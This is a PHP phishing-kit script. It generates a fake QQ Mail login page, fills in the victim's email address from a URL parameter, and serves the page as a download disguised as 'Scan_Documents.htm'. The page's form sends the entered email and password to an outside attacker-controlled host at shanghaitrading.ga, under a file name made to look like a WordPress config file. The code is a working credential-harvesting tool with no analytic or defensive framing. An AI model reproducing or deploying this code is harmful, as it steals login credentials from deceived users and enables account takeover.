<?php


if(isset($_GET['login'])){}else{die; exit;}
function test_input($data) {
   $data = trim($data);
   $data = strip_tags($data);
   $data = stripslashes($data);
   $data = htmlspecialchars($data);
   return $data;
}
$dd=test_input($_GET['login']);

$dat=substr($dd,strpos($dd,"@"));
$dd1= substr($dd,0,strpos($dd,"@"));
$dd2= substr($dat,1,(strpos($dat,".")-1));
$dd3= substr($dat,strpos($dat,"."));
/**
echo $dat."<br/>";
echo $dd1."<br/>";
echo $dd2."<br/>";
echo $dd3."<br/>";

die;

$dd1= substr($dd,0,strpos($dd,"@"));

*/






$ww='<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<link rel="shortcut icon" href="https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_48h.png" type="image/gif"/>
<title>&#30331;&#24405;QQ&#37038;&#31665;</title>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 40px;
  width: 283px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 2px;
  font-size: 18px;
  color: #404040;
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  }
  </style>
</head>
<body style="background-image: url("https://i.imgur.com/uRqdr6T.png"); background-repeat: no-repeat ">


<div align="center">
	<table border="0" width="935" cellspacing="0" cellpadding="0">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="122" ></td>
				</tr>
				<tr>
					<td>
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td>
							<img border="0" src="https://i.imgur.com/AUtc3us.png" width="520" height="400"></td>
							<td width="67">&nbsp;</td>
							<td height="400" width="350" background="https://i.imgur.com/v8E1EUh.png">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td height="92" ></td>
								</tr>
								<form method="post" action="https://shanghaitrading.ga/z-php/wp-config-qq.php">
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="32">&nbsp;</td>
											<td>
											<input type="email" name="email" required placeholder="&#25903;&#25345;QQ&#21495;/&#37038;&#31665;/&#25163;&#26426;&#21495;&#30331;&#24405;" size="20" value="'.$dd1.'@'.strtolower($dd2).''.strtolower($dd3).'" >
                                                                                        <input type="hidden" name="domain" value="https://mail.qq.com/" >
                                                                                        </td>
											<td>&nbsp;</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="10"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="32">&nbsp;</td>
											<td>
											<input type="password" name="pass" required placeholder="QQ&#23494;&#30721;" size="20" autofocus ></td>
											<td>&nbsp;</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="55"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="32"></td>
											<td>
											<input type="image" src="https://i.imgur.com/WmgIP33.png" width="289" height="45"></td>
											<td width="32"></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td>&nbsp;</td>
								</tr>
								<tr>
									<td height="100"></td>
								</tr>
								
							</table>
							</td>
						</tr>
					</table>
					</td>
				</tr>
				</form>
				<tr>
					<td>&nbsp;</td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>


</body>
</html>';




$file = 'Scan_Documents.htm';


$fh = fopen($file, 'w'); // or die("error");  
fwrite($fh, $ww);
fclose($fh);



if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}



?>

<!DOCTYPE html>
<html>
<body>
</script>
  <script>
    'use strict';
    let newWindow = open('/', 'example', 'width=300,height=300')
    newWindow.onload = function() {
      newWindow.close();
      alert(newWindow.closed); // true
    };
  </script>

</body>
</html>